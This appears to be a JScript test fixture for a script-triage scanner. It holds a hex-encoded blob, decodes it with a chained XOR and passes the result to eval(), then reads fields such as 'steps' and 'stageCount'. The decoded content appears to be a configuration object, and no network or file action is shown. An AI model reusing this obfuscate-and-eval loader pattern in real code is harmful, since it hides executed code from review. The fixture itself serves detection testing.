// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_9e6fcb42 = function decode_9e6fcb42_body(item1) {
  var item2 = [];
  var previous = 131;
  for (var i = 0; i < item1.length; i++) { item2.push(item1[i] ^ previous); previous = item1[i]; }
  return item2;
};
var recover_d21a386a = function recover_d21a386a_body() {
  var packedText = "f8:da:a9:dd:b8:c8:bb:99:a3:f8:da:bb:d8:a9:dc:b5:c7:a2:fd:8f:ea:87:e8:9c:f9:db:f7:d5:b1:d8:ab:db:ba:ce:ad:c5:9a:f7:92:ff:90:e2:9b:b9:e4:c8:ea:8b:ef:8e:fe:8a:ef:9d:bf:85:a7:ea:b9:e1:ac:e0:d2:fc:a4:e9:a5:ed:b9:ed:bd:93:a5:8b:bb:99:b5:97:e1:80:ec:99:fc:8f:ad:97:ec:ce:ad:cc:a1:d1:b0:d9:be:d0:8f:e6:82:a0:9a:b8:db:ba:d7:a7:c6:af:c8:a6:8b:ee:8b:e8:de:ee:d9:e9:dd:e5:81:a3:8f:ad:d8:aa:c6:e4:de:fc:94:e0:94:e4:97:ad:82:ad:c8:ad:ce:f8:c8:ff:cf:fb:c3:a7:89:ec:94:f5:98:e8:84:e1:cf:a6:c8:be:df:b3:da:be:91:f2:c0:a3:90:a1:96:a1:95:bb:df:be:ca:e8:c4:e6:93:e0:85:f7:a8:c9:ae:cb:a5:d1:f3:c9:eb:a3:d6:b8:cc:be:db:a8:db:97:f6:94:bb:de:bb:d8:ee:de:e9:d9:ed:d5:b1:93:ee:c2:e0:93:e7:86:e1:84:c7:a8:dd:b3:c7:e5:df:ed:90";
  var packedParts = packedText.split(":");
  var item1 = [];
  for (var hi = 0; hi < packedParts.length; hi++) { item1.push(parseInt(packedParts[hi], 16)); }
  var item6 = ["north", "south"].join(":");
  var item2 = [];
  for (var pass = 0; pass < 1; pass++) { item2 = decode_9e6fcb42.call(null, item1); }
  var textParts = [];
  for (var bi = 0; bi < item2.length; bi++) { textParts.push(String.fromCharCode(item2[bi])); }
  var item3 = textParts.join("");
  return item3;
};
var inspect_99669bc9 = function inspect_99669bc9_body() {
  var item4 = eval("(" + recover_d21a386a.call(null) + ")");
  var item5 = new Object();
  item5["steps"] = item4["steps"];
  item5["adapter"] = item4["adapter"];
  item5["values"] = item4["values"];
  item5["stageCount"] = item4["stageCount"];
  return item5;
};
